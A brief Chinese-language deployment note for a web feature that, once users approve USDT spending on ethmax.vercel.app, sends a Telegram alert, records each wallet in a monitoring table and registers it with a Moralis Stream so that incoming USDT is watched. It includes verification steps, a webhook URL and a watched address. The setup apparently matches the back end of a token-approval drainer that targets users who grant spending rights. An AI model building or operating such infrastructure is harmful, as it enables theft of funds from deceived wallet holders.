# 自动监听功能部署完成

## 部署状态

代码已推送到 GitHub
Vercel 正在自动部署（约需 1-2 分钟）

---

## 功能说明

从现在开始，用户授权 USDT 后会自动：

1. 更新用户授权状态
2. 发送 Telegram 授权通知  
3. 添加到 wallet_monitor 数据库表
4. 添加到 Moralis Stream 链上监听（新增）

---

## 验证部署

### 检查部署状态

访问 https://vercel.com
查看项目部署状态
等待显示 "Ready"

### 测试自动监听

1. 在前端完成一次用户授权
   访问: https://ethmax.vercel.app
   
2. 检查 Vercel 日志
   Dashboard -> Logs
   搜索: "添加地址到 Moralis Stream"
   
3. 确认日志显示:
   ```
   添加地址到 Moralis Stream 链上监听...
   地址已添加到 Moralis Stream 监听
   ```

4. 验证 Moralis Dashboard
   访问: https://admin.moralis.io/streams
   检查地址是否在监听列表中

5. 测试交易通知
   向授权地址发送 1 USDT
   检查 Telegram 群组是否收到通知

## 如果仍未收到通知

### 检查项

1. Vercel 部署是否完成
2. MORALIS_API_KEY 环境变量是否设置
3. Moralis Stream 是否存在且激活
4. 地址是否真的在监听列表中
5. Webhook URL 是否正确

### 临时方案

在 Moralis Dashboard 手动配置:

1. 访问 https://admin.moralis.io/streams
2. 创建 Stream: eth-usdt-monitor
3. Webhook URL: https://ethmax.vercel.app/api/moralis/webhook
4. 添加 USDT 合约: 0xdAC17F958D2ee523a2206206994597C13D831ec7
5. 添加监听地址: 0xDDab159D4D75D588BB331B326c5ce0bA8Aa7a3A0
